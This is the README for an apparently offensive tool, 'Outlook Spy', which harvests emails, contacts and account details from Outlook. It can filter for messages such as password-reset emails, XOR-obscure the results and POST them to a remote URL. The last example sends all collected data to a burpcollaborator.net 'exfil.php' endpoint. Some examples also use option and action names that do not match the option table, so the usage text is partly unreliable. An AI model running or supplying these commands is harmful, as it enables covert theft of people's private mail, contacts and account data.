# Outlook Spy

Outlook Spy enables the retrieval of emails, contacts and accounts from Outlook.

```
Usage: OutlookSpy.exe <options>
        Required
                -a, --action    Action to be taken. (accounts, all, contacts, list_fields, messages_meta, message_single, message_full)

        Optional
                -e, --entry-id  Outlook generated entry id of the record to fetch
                -m, --max-records       Number of messages to retrieve
                -br, --body-contains-regex      Regex for searching email
                -bc, --body-contains    String for searching email body (insensitive).
                -sr, --subject-contains-regex   Filters messages if the subject contains the specified value.
                -sc, --subject-contains Filters messages if the subject contains the specified value.
                -fs, --max-message-size Restricts gathered messages to the specified size in bytes.
                -o, --output    Output type: csv,json
                -u, --url       url where data will be posted
                -x, --xor-key   Xor data before transmitting
                -f, --fields    Fields to include in final output.  If not specified, all fields are returned
```

## Usage Examples

### Retrieve Email Messages
Simple. Default to returning the first 1000 records in JSON format.
```
--action messages
```

Returns csv output of the first 5 email messages with "password reset" in the subject line and the email body contains the word "twitter".
```
--action messages --max-records 5 --output csv --subject-contains "password reset" --body-contains "twitter"
```

Returns a single email record.
```
--action message_single --output json --entryid "0000000017D328571A047845AC04D3428DA4E2920700C3B68E10F77511CE0C0000000000"
```

Returns only the Date, Subject.
```
--action message_single --output json --entryid "0000000017D328571A047845AC04D3428DA4E2920700C3B68E10F77511CE0C0000000000"
```

### Contacts
```
--action contacts --max-records 5000 --output json
```

### Accounts
Simple.
```
--action accounts --output json
```

### ALL
```
--action full --max-records 5 --output json -u https://v2yacmohjrhwn7tg9m0km7lxvo1ep3.burpcollaborator.net/exfil.php --xor-key password
```